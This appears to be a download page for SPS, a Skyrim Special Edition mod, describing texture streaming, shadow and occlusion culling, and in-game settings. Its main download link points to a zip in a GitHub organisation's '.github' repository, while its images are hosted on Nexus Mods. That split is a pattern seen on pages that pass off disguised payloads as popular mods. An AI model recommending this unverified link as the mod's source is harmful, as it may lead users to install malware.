# Skyrim Performance Solution (SPS) for Skyrim Special Edition: Reduce VRAM Pressure, Stutters, and Shadow Rendering Overhead

Skyrim Performance Solution (SPS) reduces performance overhead in heavily modded Skyrim Special Edition and Anniversary Edition through distance-based texture streaming, shadow culling, and fewer unnecessary rendering operations. It helps manage VRAM usage with large texture packs and reduces stuttering associated with video memory overflow. A separate build provides texture streaming and shadow optimizations for Skyrim VR.

> **[Download the latest version of Skyrim Performance Solution (SPS) →](https://github.com/Skyrim-Performance-Solution-SPS/.github/releases/download/Latest/SkyrimSE.SPS.v.2.0.0.zip)**

![Skyrim outdoor scene with SPS enabled and performance statistics displayed](https://staticdelivery.nexusmods.com/mods/1704/images/194164/194164-1791474788-1790175512.jpg)

![The same Skyrim outdoor scene with SPS disabled for comparison](https://staticdelivery.nexusmods.com/mods/1704/images/194164/194164-1791474789-333949975.jpg)

## Distance-Based Texture Streaming and VRAM Management

Large texture packs can push Skyrim beyond the video memory available to the game. When VRAM becomes saturated, Windows may move graphics data into system memory, causing interruptions as the engine requests textures and other resources.

SPS addresses this problem by adjusting texture resolution according to distance and available VRAM. Distant objects use smaller texture versions in memory, while nearby objects regain their full texture detail as the game reloads higher-resolution data in the background.

The streaming system includes several controls:

- **VRAM budget management:** Maintains a configurable amount of available video memory and reduces textures when the remaining budget becomes insufficient.
- **Texture size limits:** Sets a maximum streamed texture resolution of 1K, 2K, 4K, 8K, or unlimited, independently of current VRAM pressure.
- **Prioritized texture restoration:** Reloads the textures needed most urgently first and retries unsuccessful reloads instead of leaving textures permanently reduced.
- **Remembered texture sizes:** Reuses previously determined texture sizes across sessions and loading screens, helping limit memory spikes when revisiting areas.
- **Texture RAM buffering:** Retains repeatedly reloaded textures in system memory, a useful option for setups with large texture packs, including 8K textures.

The streaming system excludes the interface, maps, distant terrain LOD, fonts, books, visual effects, and the sky. Distant NPC clothing and armor can also use texture streaming, while body, face, and hair texture reduction remains a separate test option.

## Shadow Culling and Rendering Overhead

Skyrim calculates shadows for many objects that contribute little to the player's view. SPS reduces this work by selectively excluding objects from shadow-rendering passes according to their size, distance, lighting conditions, or other culling rules.

Its shadow optimizations cover several types of rendering work:

- **Sun shadow culling:** Small, distant objects can stop casting sun shadows when they contribute little to the scene.
- **Torch and fire shadow culling:** Reduces shadow calculations for small or distant objects around local light sources while retaining shadows for nearby objects.
- **Character shadow culling:** Prevents sufficiently distant characters from casting shadows that have little visible impact.
- **Static light shadow caching:** Reuses shadow data for stationary lights, including wall lamps and fireplaces, rather than rebuilding their shadow maps unnecessarily. This feature is specific to Anniversary Edition.
- **Additional draw-call reductions:** Shadow instancing can group identical simple meshes into a single draw call during the sun shadow pass. This Anniversary Edition feature is disabled by default.

SPS also includes an optional far-shadow cache in the non-VR build. This reduces repeated rendering of distant sun shadows when the camera and sun have not changed. The cache has its own settings and is treated as a beta feature.

![SPS measurements comparing VRAM use, frame rates, and rendering overhead in selected test scenes](https://staticdelivery.nexusmods.com/mods/1704/images/194164/194164-1791380775-742989922.png)

The measurements illustrate results from particular scenes and hardware configurations. Actual performance depends on the installed mods, graphics settings, and the system running the game.

## Occlusion Culling and Reduced Engine Work

SPS also avoids rendering objects that cannot contribute to the visible scene. Its occlusion culling skips drawing objects fully hidden behind walls, buildings, terrain, or other solid geometry. The latest non-VR build includes this functionality as a standard optimization.

The occlusion system follows changes in the camera view, allowing it to account for movement and turning rather than relying exclusively on a previous view. It also avoids treating the player, mount, or first-person arms and weapons as objects that conceal other geometry.

Further optimizations reduce CPU-side rendering work:

- **Light assignment throttling:** Moving lights do not repeatedly search for affected geometry when their position has not changed.
- **Scene subtree pruning:** Entire branches of the scene can be skipped during shadow and skylighting passes when they do not need to contribute to those calculations.
- **Skylighting culling:** On setups using Community Shaders skylighting, small objects can be excluded from the skylighting map.
- **Decal culling:** Small details such as distant footprints are omitted when they are too far away to contribute meaningfully to the rendered scene.

Together, these features reduce unnecessary rendering calculations without replacing Skyrim's world assets or changing its gameplay content.

## Live Controls and Runtime Behavior

SPS includes an in-game menu with separate pages for its main feature groups. Settings can be adjusted during play and are saved automatically. An assignable hotkey, set to Page Up by default, switches the optimizations on or off for direct comparison.

This makes it possible to evaluate the effect of individual settings and compare the game with SPS enabled and disabled in the same location. A built-in help page also connects common visual issues with the relevant settings.

The plugin operates at runtime: it does not modify the game's original files or store its settings in save data. Its rendering optimizations are separate from changes to quests, characters, equipment, or other gameplay content.

## Feature Availability in Skyrim SE, Anniversary Edition, and VR

SPS supports the standard Skyrim Special Edition and Anniversary Edition builds, with selected features varying by edition.

Anniversary Edition includes additional static-light shadow caching and shadow instancing options. The far-shadow cache is also available as an optional beta feature in the non-VR build.

Skyrim VR uses a separate build with its own texture-streaming and shadow-culling functionality. The newer occlusion-culling system and far-shadow cache are not active in VR.

These differences matter when choosing which SPS feature set matches the game being played. The core purpose remains the same: manage texture memory and reduce unnecessary rendering work while retaining the scene detail that matters at normal viewing distances.
